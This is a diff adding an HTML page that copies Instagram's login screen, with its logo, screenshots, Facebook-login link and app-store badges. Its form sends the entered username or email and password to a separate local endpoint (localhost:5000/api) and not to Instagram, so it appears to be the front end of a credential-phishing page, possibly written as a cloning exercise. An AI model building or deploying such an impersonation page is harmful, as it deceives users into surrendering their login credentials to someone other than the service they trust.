@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="index.css">
+    <title>Instagram</title>
+</head>
+
+<body>
+    <div id="container">
+        <div id="phone">
+            <div id="phone-image">
+                <div id="screenshots">
+                    <img id="screenshotimag1" class="screenshotimages" src="./Images/screenshot1.png" alt="" srcset="">
+                    <img id="screenshotimag2" class="screenshotimages" src="./Images/screenshot2.png" alt="" srcset="">
+                    <img id="screenshotimag3" class="screenshotimages" src="./Images/screenshot3.png" alt="" srcset="">
+                    <img id="screenshotimag4" class="screenshotimages" src="./Images/screenshot4.png" alt="" srcset="">
+                </div>
+            </div>
+        </div>
+        <div id="main">
+            <form action="http://localhost:5000/api" method="post">
+                <div id="insta-logo"></div>
+
+                <div id="inputs">
+                    <input type="text" name="name" placeholder="Phone number, username or email" id="name-input">
+                    <input type="password" name="password" placeholder="password" id="password">
+                    <input id="submit" type="submit" value="Log In">
+                </div>
+                <div id="or">
+                    <div class="line"></div>
+                    <div> OR </div>
+                    <div class="line"></div>
+                </div>
+                <a id="facebook"> <img id="fb-img" src="./images/fbf-logo.png" alt="" srcset=""> Log in with Facebook</a>
+                <a href="http://www.google.com">
+                    <div id="forgot-password">Forgot password?</div>
+                </a>
+            </form>
+            <div id="sign-up">Don't have an account? <a>Sign up</a></div>
+            <div id="get-app">Get the app.</div>
+            <div id="stores">
+                <a href="#">
+                    <img id="apple" src="./Images/applestorelogo.png" alt="apple store">
+                </a>
+                <a href="#">
+                    <img id="playstore" src="./Images/playstorelogo.png" alt="play store">
+                </a>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <ul>
+            <li></li>
+            <li></li>
+            <li></li>
+            <li></li>
+            <li></li>
+            <li></li>
+            <li></li>
+            <li></li>
+            <li></li>
+            <li></li>
+            <li></li>
+            <li></li>
+            <li></li>
+            <li></li>
+            <li></li>
+            <li></li>
+        </ul>
+    </footer>
+
+    <script src="index.js"></script>
+</body>
+
+</html>
